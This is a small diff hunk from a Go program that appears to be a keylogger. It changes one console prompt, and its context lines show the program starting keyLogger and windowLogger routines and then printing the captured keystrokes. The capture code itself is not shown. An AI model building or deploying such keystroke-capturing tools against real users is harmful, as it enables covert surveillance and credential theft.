@@ -296,7 +296,7 @@ func main() {
 	fmt.Println("Starting KeyLogger!")
 	go keyLogger()
 	go windowLogger()
-	fmt.Println("Press Enter on me to see logs.")
+	fmt.Println("Press Enter to see logs.")
 	os.Stdin.Read([]byte{0})
 	fmt.Println(tmpKeylog)
 	fmt.Println("Press Enter to Exit.")
